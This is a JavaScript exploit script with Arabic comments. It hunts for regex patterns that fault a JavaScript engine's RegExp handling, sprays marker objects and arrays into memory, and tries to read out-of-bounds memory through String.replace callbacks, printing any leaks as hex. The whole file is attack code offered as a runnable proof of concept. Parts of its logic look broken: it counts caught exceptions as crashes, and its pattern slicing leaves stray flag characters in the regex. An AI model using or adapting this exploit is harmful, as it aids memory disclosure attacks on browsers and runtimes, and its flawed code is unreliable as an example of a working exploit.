import { log, sleep } from './module/utils.mjs';

class RegExpOOBExploit {
    constructor() {
        this.leakedData = [];
    }

    async execute() {
        // المرحلة 1: إيجاد النمط الذي يسبب الـ crash باستمرار
        const crashPattern = await this.findCrashPattern();
        
        // المرحلة 2: استخدامه لتسريب الذاكرة
        if (crashPattern) {
            return await this.exploitLeak(crashPattern);
        }
        
        return null;
    }

    async findCrashPattern() {
        const patterns = [
            "/(?!(?=^a|()+()+x)(abc))/gmu",
            "/(?!(?=^a|x)(abc))/gmu",
            "/(?=^)./gmu",
            "/(?=$)./gmu",
            "/^(?:)/gmu",
            "/$(?:)/gmu"
        ];

        for (const pattern of patterns) {
            log(`Testing crash pattern: ${pattern}`);
            
            if (await this.testCrash(pattern)) {
                log(`CRASH CONFIRMED with: ${pattern}`);
                return pattern;
            }
            await sleep(10);
        }
        return null;
    }

    async testCrash(patternStr) {
        try {
            const regex = new RegExp(patternStr.slice(1, -1));
            const str = String.fromCodePoint(0x1F600).repeat(50); // 😀
            
            str.replace(regex, '|');
            return false; // No crash
        } catch (e) {
            return true; // Crash occurred
        }
    }

    async exploitLeak(crashPattern) {
        log("Starting memory leak exploitation...");
        
        // إعداد كائنات في الذاكرة لتسريبها
        const targets = this.sprayTargetObjects();
        
        for (let attempt = 0; attempt < 100; attempt++) {
            const leaked = await this.attemptLeak(crashPattern, attempt);
            if (leaked) {
                this.leakedData.push(leaked);
                log(`Leak ${this.leakedData.length}: ${leaked}`);
            }
            
            if (this.leakedData.length >= 5) {
                log("Sufficient leaks obtained!");
                return this.leakedData;
            }
            
            await sleep(5);
        }
        
        return this.leakedData;
    }

    sprayTargetObjects() {
        const targets = [];
        
        // كائنات يمكن التعرف عليها عند تسريبها
        for (let i = 0; i < 100; i++) {
            targets.push({
                type: "target",
                id: i,
                marker: 0x41414141 + i,
                data: new ArrayBuffer(64),
                string: `TARGET_${i}_${"A".repeat(50)}`
            });
        }
        
        // مصفوفات يمكن التعرف عليها
        for (let i = 0; i < 50; i++) {
            const arr = [];
            for (let j = 0; j < 100; j++) {
                arr.push(0x42424242 + j);
            }
            targets.push(arr);
        }
        
        return targets;
    }

    async attemptLeak(patternStr, attempt) {
        try {
            const regex = new RegExp(patternStr.slice(1, -1));
            
            // string مصمم خصيصاً
            const crafted = this.createCraftedString(attempt);
            
            let leakedInfo = null;
            
            const result = crafted.replace(regex, (match, offset, fullString) => {
                // إذا كان الـ match يحتوي على بيانات مسربة
                if (match.length > 10 || this.containsBinary(match)) {
                    leakedInfo = {
                        attempt: attempt,
                        match: match,
                        length: match.length,
                        offset: offset,
                        hex: this.stringToHex(match.substring(0, 20))
                    };
                }
                return '|';
            });
            
            return leakedInfo;
            
        } catch (e) {
            // Crash during leak attempt
            log(`Leak attempt ${attempt} crashed: ${e}`);
            return null;
        }
    }

    createCraftedString(attempt) {
        // string مع Unicode characters وأحجام مختلفة
        const baseChar = String.fromCodePoint(0x1F600 + (attempt % 100)); // مختلف في كل مرة
        const size = 30 + (attempt % 20);
        
        return baseChar.repeat(size);
    }

    containsBinary(str) {
        // تحقق إذا كان الـ string يحتوي على بيانات binary
        for (let i = 0; i < str.length; i++) {
            const code = str.charCodeAt(i);
            if (code < 32 || code > 126) {
                if (code !== 10 && code !== 13 && code !== 9) { // ليس whitespace عادي
                    return true;
                }
            }
        }
        return false;
    }

    stringToHex(str) {
        let hex = '';
        for (let i = 0; i < str.length; i++) {
            hex += str.charCodeAt(i).toString(16).padStart(4, '0') + ' ';
        }
        return hex;
    }
}

// تشغيل سريع للاختبار
async function quickTest() {
    const exploit = new RegExpOOBExploit();
    
    log("Quick crash test...");
    const crashPattern = await exploit.findCrashPattern();
    
    if (crashPattern) {
        log("Proceeding with full exploitation...");
        const leaks = await exploit.exploitLeak(crashPattern);
        
        if (leaks && leaks.length > 0) {
            log("EXPLOIT SUCCESSFUL!");
            log(`Obtained ${leaks.length} memory leaks`);
            
            // عرض أول 3 تسريبات
            for (let i = 0; i < Math.min(3, leaks.length); i++) {
                log(`Leak ${i}: ${leaks[i].hex}`);
            }
        }
    } else {
        log("No reliable crash pattern found");
    }
}

// التشغيل
quickTest();